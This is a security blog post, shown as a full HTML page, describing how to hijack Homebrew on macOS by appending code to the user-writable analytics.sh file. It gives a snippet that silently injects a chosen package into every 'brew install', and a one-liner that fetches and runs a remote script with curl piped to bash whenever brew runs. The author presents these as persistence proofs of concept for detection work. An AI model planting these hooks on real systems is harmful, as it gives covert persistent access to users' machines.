<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS" /><meta name="author" content="noncetonic" /><meta property="og:locale" content="en" /><meta name="description" content="Foreward" /><meta property="og:description" content="Foreward" /><link rel="canonical" href="https://blacksunhackers.club/posts/Surreptitious-hijacking-brew-macOS/" /><meta property="og:url" content="https://blacksunhackers.club/posts/Surreptitious-hijacking-brew-macOS/" /><meta property="og:site_name" content="Blacksun Hackers Club" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-04-05T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS" /><meta name="twitter:site" content="@BlacksunLabs_" /><meta name="twitter:creator" content="@https://twitter.com/noncetonic" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"noncetonic"},"description":"Foreward","url":"https://blacksunhackers.club/posts/Surreptitious-hijacking-brew-macOS/","@type":"BlogPosting","headline":"HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS","dateModified":"2021-09-12T03:17:07+08:00","datePublished":"2019-04-05T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://blacksunhackers.club/posts/Surreptitious-hijacking-brew-macOS/"},"@context":"https://schema.org"}</script><title>HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS | Blacksun Hackers Club</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Blacksun Hackers Club"><meta name="application-name" content="Blacksun Hackers Club"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/images/bsh_logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Blacksun Hackers Club</a></div><div class="site-subtitle font-italic">Just a bunch of hackers doing what we find fun.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/BlacksunLabs" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/BlacksunLabs_" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Written by <a href=https://twitter.com/noncetonic> <b>noncetonic</b> </a> </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Apr 5, 2019, 12:00 AM +0800" >Apr 5, 2019<i class="unloaded">2019-04-05T00:00:00+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 11, 2021, 12:17 PM -0700" >Sep 11, 2021<i class="unloaded">2021-09-12T03:17:07+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="770 words">4 min read</span></div></div><div class="post-content"><h2 id="foreward">Foreward</h2><p>I thought it might be fun to poke at Homebrew and see what kind of things I could find. Welcome to the beginning of what I hope will be a small but fun series of posts on abusing HomeBrew.</p><p>HomeBrood 0x00</p><h2 id="homebrew-analytics">Homebrew Analytics</h2><p>By default, <code class="language-plaintext highlighter-rouge">homebrew</code> is set to phone home to Google Analytics over HTTPS and provide a number of known, documented, metadata strings claimed by the Homebrew team to help maintainers and as such “leaving it on is appreciated”.</p><p>The more paranoid-inclined user seeking to cut down on the data they freely hand over to Google and other analytic companies may already know to disable analytics right after installing homebrew and before going off and installing packages. Unfortunately, as will be shown homebrew analytics can be far more dangerous than it would appear.</p><p>Check out https://github.com/Homebrew/brew/blob/master/docs/Analytics.md to read more about the information gathered by Homebrew Analytics and how to disable this feature or just run <code class="language-plaintext highlighter-rouge">brew analytics off</code> to disable Homebrew Analytics if <code class="language-plaintext highlighter-rouge">brew analytics</code> does not return “Analytics is disabled.”</p><h3 id="analytricks">Analytricks</h3><p>Reading through <code class="language-plaintext highlighter-rouge">/usr/local/Homebrew/Library/Homebrew/brew.sh</code> reveals an interesting opportunity for a number of possible scenarios for attacks but a basic example of persistence will be provided here to keep with the context of this file.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre># Don't need shellcheck to follow this `source`.
# shellcheck disable=SC1090
source "$HOMEBREW_LIBRARY/Homebrew/utils/analytics.sh"
setup-analytics
</pre></table></code></div></div><blockquote><p>From <code class="language-plaintext highlighter-rouge">/usr/local/Homebrew/Library/Homebrew/brew.sh</code></p></blockquote><p>First and foremost the <code class="language-plaintext highlighter-rouge">$HOMEBREW_LIBRARY/Homebrew/utils/analytics.sh</code> file (full, expanded path <code class="language-plaintext highlighter-rouge">/usr/local/Homebrew/Library/Homebrew/utils/analytics.sh</code>) is sourced blindly without attempting to ensure the file even exists and then proceeds to run the newly exported <code class="language-plaintext highlighter-rouge">setup-analytics</code> function donated by analytics.sh. This means that even when Homebrew Analytics has been explicitly disabled on a system it is not until after all code within <code class="language-plaintext highlighter-rouge">analytics.sh</code> is run that Homebrew checks whether or not analytics should be sent.</p><p>It’s simple to see how easily the user-owned, user-writeable <code class="language-plaintext highlighter-rouge">analytics.sh</code> file can be abused by simply adding commands to the end of the <code class="language-plaintext highlighter-rouge">analytics.sh</code> file or within the <code class="language-plaintext highlighter-rouge">setup-analytics</code> function, hell you’re free to write your own bash script altogether and including an empty setup-analytics function to keep from causing an error. This all happens pretty early on in the logic for subcommands of the <code class="language-plaintext highlighter-rouge">brew</code> command; shortly after determining the subcommand and well before processing package names and subcommand options are slurped in for processing. This makes it possible to pass a malicious package name during a <code class="language-plaintext highlighter-rouge">brew install</code> command in addition to running just about anything you want.</p><p>Let’s explore some of these attacks and their implementation.</p><h4 id="hijacking-brew-install">Hijacking <code class="language-plaintext highlighter-rouge">brew install</code></h4><p>Add the following tiny modification at the bottom of the <code class="language-plaintext highlighter-rouge">analytics.sh</code> file</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre># Prepend a defined package to all invocations of `brew install`
if [[ "$HOMEBREW_COMMAND" = "install" ]]
then
  set "YOUR_DESIRED_PACKAGE_HERE" "$@"
fi
</pre></table></code></div></div><p>Nice and easy. As the <code class="language-plaintext highlighter-rouge">analytics.sh</code> file is sourced into <code class="language-plaintext highlighter-rouge">brew.sh</code> we are lucky enough to have access to the <code class="language-plaintext highlighter-rouge">$HOMEBREW_COMMAND</code> variable which holds the subcommand sent to the <code class="language-plaintext highlighter-rouge">brew</code> command as well as <code class="language-plaintext highlighter-rouge">$@</code> which contains the arguments passed to the subcommand.</p><p>Presumably the possibly most esoteric bit of code here for beginner BASH scripters is the line starting with <code class="language-plaintext highlighter-rouge">set</code>.<br /> The <code class="language-plaintext highlighter-rouge">set</code> command allows rearranging the order of the arguments passed on the commandline and in this example simply prepends whichever package you choose to the list of arguments the user provided which ensures our desired package is installed first and can hopefully get lost in the wall of text generated during a <code class="language-plaintext highlighter-rouge">brew install</code>.</p><p>This same concept can be applied to run any commands you want, you are not limited to simply brew commands. For example if you’d just like to have a compromised host send a request to a server wehenever <code class="language-plaintext highlighter-rouge">brew</code> is run as a way of gaining access to the network in case of being forcefully ejected from the network or just because networks are hard a simple script could be written which sends a GET request to a remotely hosted file and executing any commands within that file.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bash &lt;(curl -s https://gist.githubusercontent.com/n0ncetonic/1d965369574a413b4dd1e4514e27992a/raw/675a9546c6ecdb46ce5a6b13a7faf63428359e53/example.sh)
</pre></table></code></div></div><p>Adding this simple one-liner into <code class="language-plaintext highlighter-rouge">analytics.sh</code> will cause the contents of the remote file to be run whenever <code class="language-plaintext highlighter-rouge">brew</code> is run.</p><h2 id="closing">Closing</h2><p>These PoCs are intended to be used as demos in aiding teams attempting to write detections around TTPs which could be leveraged by threat actors to avoid triggering common persistence detection checks . The potential for far more complex payloads which take advantage of this Technique are the responsibility of the reader to create.</p><p>If you do happen to come up with something fun that takes advantage of this simple <code class="language-plaintext highlighter-rouge">brew</code> command hijack please let me know via twitter @noncetonic</p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/macos/" class="post-tag no-text-decoration" >MacOS</a> <a href="/tags/persistence/" class="post-tag no-text-decoration" >Persistence</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS - Blacksun Hackers Club&url=https://blacksunhackers.club/posts/Surreptitious-hijacking-brew-macOS/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS - Blacksun Hackers Club&u=https://blacksunhackers.club/posts/Surreptitious-hijacking-brew-macOS/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS - Blacksun Hackers Club&url=https://blacksunhackers.club/posts/Surreptitious-hijacking-brew-macOS/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Bypassing-TCC-With-iTerm2/">Bypassing TCC With iTerm2</a><li><a href="/posts/acquiring-and-abusing-legacy-slack-tokens/">Acquiring and Abusing Slack Legacy Tokens on macOS</a><li><a href="/posts/macOS-serial-console-login/">macOS Serial Console Login</a><li><a href="/posts/cultivating-an-online-persona-1/">Cultivating An Online Persona Part 1 - Bypassing Gmail's Phone Verification</a><li><a href="/posts/post-exploitation-persistence-with-application-shims-intro/">Post Exploitation Persistence With Application Shims (Intro)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/macos/">MacOS</a> <a class="post-tag" href="/tags/post-exploitation/">Post-Exploitation</a> <a class="post-tag" href="/tags/persistence/">Persistence</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/fingerprinting/">Fingerprinting</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/osint/">OSINT</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/macOS-persistence-via-iterm/"><div class="card-body"> <span class="timeago small" >Mar 6, 2019<i class="unloaded">2019-03-06T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>macOS Persistence via iTerm</h3><div class="text-muted small"><p> Foreword macOS’s default Terminal.app is garbage, and everyone knows it; they also know iTerm is by and large the most popular terminal replacement for macOS. But did you know iTerm is also a fanta...</p></div></div></a></div><div class="card"> <a href="/posts/chrome-arbitrary-javascript-injection-via-applescript/"><div class="card-body"> <span class="timeago small" >Dec 13, 2017<i class="unloaded">2017-12-13T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Chrome Arbitrary Javascript Injection Via AppleScript</h3><div class="text-muted small"><p> Foreword I’ve had a PoC for this technique for a little while as part of research for a future talk on the subject of post-exploitation in MacOS, but as an article has surfaced detailing the adware...</p></div></div></a></div><div class="card"> <a href="/posts/macOS-serial-console-login/"><div class="card-body"> <span class="timeago small" >Nov 18, 2018<i class="unloaded">2018-11-18T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>macOS Serial Console Login</h3><div class="text-muted small"><p> Foreword This short post documents a technique for authenticating as root on macOS and provides procedures for bypassing the default configuration of macOS which explicitly disables the root user. ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/acquiring-and-abusing-legacy-slack-tokens/" class="btn btn-outline-primary" prompt="Older"><p>Acquiring and Abusing Slack Legacy Tokens on macOS</p></a> <a href="/posts/Hijacking-Web-Traffic-MDM-Profiles/" class="btn btn-outline-primary" prompt="Newer"><p>Hijacking Web Traffic On MacOS and iOS With MDM Profiles</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/BlacksunLabs_">Blacksun Labs</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/macos/">MacOS</a> <a class="post-tag" href="/tags/post-exploitation/">Post Exploitation</a> <a class="post-tag" href="/tags/persistence/">Persistence</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/fingerprinting/">Fingerprinting</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/osint/">OSINT</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://blacksunhackers.club{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
